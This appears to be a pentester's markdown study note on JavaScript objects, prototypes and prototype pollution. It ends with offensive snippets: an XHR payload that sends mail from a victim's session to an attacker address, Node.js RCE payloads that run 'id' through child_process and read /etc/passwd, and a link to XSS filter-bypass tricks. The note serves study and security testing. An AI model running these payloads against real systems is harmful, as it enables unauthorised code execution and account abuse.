# Interchangeable syntax

```jsx
> user = {"name":"0xbro", "role":"admin"};
Object { name: "0xbro", role: "admin" }

> console.log(user.name);
0xbro

console.log(user['name']);
0xbro
```

# Objects and `Object`

>[!tip]
>**Objects** are simply a **collection of key and value pairs.**

```jsx
> user = {"name":"0xbro","role":"admin"}
Object { name: "0xbro", role: "admin" }

> user.name
"0xbro"
> user
Object { name: "0xbro", role: "admin" }
name: "0xbro"
role: "admin"
<prototype>: Object { … }
__defineGetter__: function __defineGetter__()
__defineSetter__: function __defineSetter__()
__lookupGetter__: function __lookupGetter__()
__lookupSetter__: function __lookupSetter__()
__proto__: 
constructor: function Object()
hasOwnProperty: function hasOwnProperty()
isPrototypeOf: function isPrototypeOf()
propertyIsEnumerable: function propertyIsEnumerable()
toLocaleString: function toLocaleString()
toString: function toString()
valueOf: function valueOf()
<get __proto__()>: function __proto__()
<set __proto__()>: function __proto__()

```

`Object` is a basic object. It is the template for all newly created objects.
It is possible to create an empty object by passing `null` to `Object.create`

```jsx
> Object.create(null);
Object {  }

> console.log(Object.create(null))
Object {  }
```

that results to be just an empty dictionary: `{}`

# Functions and Classes

>[!tip]
>In JavaScript “class” and “function” are interrelated, the “function” itself acts as the constructor for the class). **Class, functions** and **objects** also shares the **same exact structure.**

"Class" definition:
```jsx
function person(fullName, age) {
    this.age = age;
    this.fullName = fullName;
    this.details = function() {
        return this.fullName + " has age: " + this.age;
    }
}
```
![](../../zzz_res/attachments/prototype.png)

Object initialization:

```jsx
var person1 = new person("0xbro", 24);
```
![](../../zzz_res/attachments/proto.png)

# Prototypes

One thing to note is that the prototype’s attributes can be changed/modified/deleted when executing the code and their reflects directly on any related object.

```jsx
> person.prototype.addFunc1 = function(){return "Func1";}
function addFunc1()

> person1.__proto__.addFunc2 = function(){return "Func2";}
function addFunc2()

> person1.addFunc1()
"Func1"
> person1.addFunc2()
"Func2"

> person1.toString()
"[object Object]"
> person.prototype.toString = function(){return "ToString has been changed";}
function toString()

> person1.toString()
"ToString has been changed"
```

## Inheritance

>[!tip]
>In a prototype-based program, **objects inherit properties/methods from classes**. 
The classes are derived by adding properties/methods to an instance of another class or by adding them to an empty object.

![](../../zzz_res/attachments/inerit.png)

## `__proto__` pollution

>[!warning]
>Every object in JavaScript is simply a collection of key and value and every object inherits from the Object type in JavaScript. If you are able to pollute the Object type **each JavaScript object of the environment is going to be polluted!**

This is fairly simple, you just need to be able to modify some properties (key-value pairs) from an arbitrary JavaScript object, because as **each object inherits from `Object`**, **each object can access `Object` scheme**.

```jsx
function person(fullName) {
    this.fullName = fullName;
}

var person1 = new person("0xbro");
```

From the previous example it's possible to **access the structure of `Object`** using the following ways:

```jsx
> person1.__proto__.__proto__
> person.__proto__.__proto__

> person1.__proto__.__proto__ === person.__proto__.__proto__
true
```

If now a property is added to the Object scheme, every JavaScript object will have access to the new property:

```jsx
> person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
function printHello()

> person1.printHello()
Hello

> var test = {}
undefined

> test.printHello()
Hello
```

Now **each JS object** will contain the new properties!****

## `prototype` pollution

>[!warning]
>If you are able to modify the properties of a function, you can modify the `prototype` property of the function and **each new property that you adds here will be inherit by each object created from that function.**
>
>More reference: [Prototype Pollution](../Web%20&%20Network%20Hacking/Prototype%20Pollution.md)

```jsx
function person(fullName) {
    this.fullName = fullName;
}
var person1 = new person("0xbro");
var person2 = new person("maoutis");
var person3 = new person("testname");
```

If I pollute a property of the **person** function, every object instantiated from **that function** is now polluted:

```jsx
> person.prototype.sayHello = function(){console.log("Hello");} // Add function as new property
function sayHello()

> person1.sayHello(); // inherits the function
Hello
undefined
> person2.sayHello(); // inherits the function
Hello

> person3.constructor.prototype.sayHelloBis = function(){console.log("HelloBis");} // Add function as new property using the constructor reference 
function sayHelloBis()

> person3.sayHelloBis(); // inherits the function
HelloBis

> person2.sayHelloBis(); // inherits the function 
HelloBis

> var test = {};
undefined
> test.sayHello();
Uncaught TypeError: test.sayHello is not a function // Error because the variable is not instanciated from "**person"**
```

There are 2 ways to abuse [Prototype Pollution](../Web%20&%20Network%20Hacking/Prototype%20Pollution.md) to poison **EVERY** JS object (like with `__proto__`).

- pollute the property prototype of **`Object`**

```jsx
Object.prototype.sayBye = function(){console.log("bye!")}
```

- poison the prototype of a constructor of a dictionary variable

```jsx
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```

# **XMLHttpRequest (XHR)**

```bash
var email = "attacker@offsec.local";
var subject = "hacked!";
var message = "This is a test email!";
function send_email()
{
	var uri ="/index.php/mail/composemessage/send/tabId/viewmessageTab1";
	var query_string = "?emailTo=" + email + "&emailSubject=" + subject + "&emailBodyHtml=" + message;
	xhr = new XMLHttpRequest();
	xhr.open("GET", uri + query_string, true);
	xhr.send(null);
}
send_email();
```

Parse responses:

```bash
function read_body(xhr) {
	var data;
	if (!xhr.responseType || xhr.responseType === "text") {
		data = xhr.responseText;
	} else if (xhr.responseType === "document") {
		data = xhr.responseXML;
	} else if (xhr.responseType === "json") {
		data = xhr.responseJSON;
	} else {
		data = xhr.response;
	}
	return data;
}
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
	console.log(read_body(xhr));
	}
}
xhr.open('GET', 'http://www.google.com', true);
xhr.send(null);
```

# RCE payloads

```jsx
require('util').format('%s', 'hacked')
require('child_process').exec('id')
require('fs').readFileSync('/etc/passwd')
global.process.mainModule.require(child_process).exec('id')
process.mainModule.require('child_process').execSync('echo+0xbro').toString()
```

# XSS
- [javascript-bypass-blacklists-techniques](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#javascript-bypass-blacklists-techniques)